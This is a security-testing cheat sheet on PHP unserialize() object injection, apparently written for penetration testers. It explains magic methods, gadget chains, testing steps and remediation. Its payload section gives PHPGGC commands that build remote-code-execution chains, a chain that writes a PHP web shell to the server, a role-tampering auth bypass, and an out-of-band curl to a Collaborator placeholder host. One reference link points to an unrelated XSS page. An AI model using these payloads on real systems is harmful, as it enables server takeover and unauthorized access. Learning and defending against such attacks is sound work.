# PHP Object Deserialization (unserialize())

## Overview
PHP's `unserialize()` function converts a serialized string back into a PHP object. When user-controlled data is passed to `unserialize()`, attackers can craft malicious serialized objects that trigger PHP magic methods (`__wakeup`, `__destruct`, `__toString`, `__call`) during deserialization — leading to Remote Code Execution, SQL injection, SSRF, or file deletion, depending on the classes available in the codebase (gadget chains).

## How It Works
- PHP serialized data has a recognizable format: `O:4:"User":2:{s:4:"name";s:5:"Alice";}`.
- Magic methods are invoked automatically during deserialization without explicit calls.
- `__wakeup()`: called when the object is unserialized.
- `__destruct()`: called when the object goes out of scope after unserialization.
- `__toString()`: called if the object is used as a string.
- Attackers craft objects using classes already loaded in memory (the "gadget chain") to chain method calls leading to RCE.
- PHP Generic Gadget Chains (PHPGGC) provides pre-built exploit chains for common frameworks (Laravel, Symfony, Drupal, etc.).

## Impact
- Remote Code Execution — arbitrary OS commands via gadget chains.
- File write/delete on the server.
- SSRF or SQL injection through magic method side effects.
- Complete application compromise.

## Where to Look
- Cookies or POST bodies containing `O:` or base64-encoded content that decodes to PHP serialized format.
- PHP session handling using file-based sessions with user-controlled content.
- Cache layers that store serialized PHP objects.
- APIs accepting serialized data.
- URL parameters or form fields accepting complex objects.

## Testing Steps
1. Look for `O:` in cookies, POST parameters, and HTTP headers.
2. Decode base64-encoded parameters and look for PHP serialization format.
3. Identify the PHP framework in use (Laravel, Symfony, Yii, etc.).
4. Use PHPGGC to generate a gadget chain for the identified framework.
5. Test with a sleep-based payload first (blind confirmation).
6. Test with an out-of-band interaction (DNS lookup via Burp Collaborator).
7. Try modifying object property values (change user role, bypass authentication checks).

## Payloads / Techniques
```bash
# PHP serialized format example:
# O:8:"stdClass":1:{s:4:"role";s:5:"admin";}
# O = Object, 8 = class name length, "stdClass" = class name,
# 1 = property count, s = string, 4 = key length, etc.

# Detect PHP serialization in cookie
echo "YOUR_COOKIE_VALUE" | base64 -d | strings | grep -E "^O:|^a:|^s:|^i:"

# Generate gadget chain with PHPGGC
git clone https://github.com/ambionics/phpggc
cd phpggc

# List available chains
./phpggc -l

# Generate Laravel RCE chain
./phpggc Laravel/RCE1 system id -b  # base64 encoded

# Generate Symfony chain
./phpggc Symfony/RCE4 system id

# Generate chain for file write
./phpggc Laravel/FW1 /var/www/html/shell.php "<?php system(\$_GET['c']); ?>"

# Simple property manipulation (no gadget chain needed for auth bypass)
# If user object is: O:4:"User":1:{s:4:"role";s:4:"user";}
# Change to admin:   O:4:"User":1:{s:4:"role";s:5:"admin";}
php -r 'class User{public $role="admin";} echo serialize(new User());'

# Out-of-band blind detection with PHPGGC
./phpggc Laravel/RCE1 "curl http://COLLABORATOR.burpcollaborator.net" -b
```

```php
<?php
// Simple test: does modifying the serialized object change behavior?
// Original: O:4:"User":1:{s:4:"role";s:4:"user";}
// Modified: O:4:"User":1:{s:4:"role";s:5:"admin";}
// Submit modified value as the cookie or parameter
?>
```

## Burp Suite Tips
- Use **Burp Decoder** to base64 decode cookie values and look for PHP serialization format.
- **PHP Object Injection Check** (BApp Store) extension scans for PHP deserialization.
- Use **Burp Collaborator** with a PHPGGC chain that performs DNS lookup (blind detection).
- Intercept requests in **Proxy**, decode the serialized value, modify properties, re-encode, and resend.

## Tools
- PHPGGC — https://github.com/ambionics/phpggc (gadget chain generator)
- ysoserial.net — for .NET equivalents
- php_serialized_to_json — format converters
- Burp Suite PHP Object Injection Scanner (BApp)

## Remediation
- Never pass user-controlled data to `unserialize()`.
- Use `json_decode()` instead for user data — JSON doesn't support object instantiation.
- If deserialization of PHP objects is required, use a whitelist of allowed classes with the `allowed_classes` option: `unserialize($data, ['allowed_classes' => ['SafeClass']])`.
- Keep all framework dependencies updated to remove known gadget chains.
- Use integrity signatures: HMAC the serialized data, verify before deserializing.
- Implement WAF rules to detect PHP serialized format in user input.

## References
https://portswigger.net/web-security/deserialization
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
https://github.com/ambionics/phpggc
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
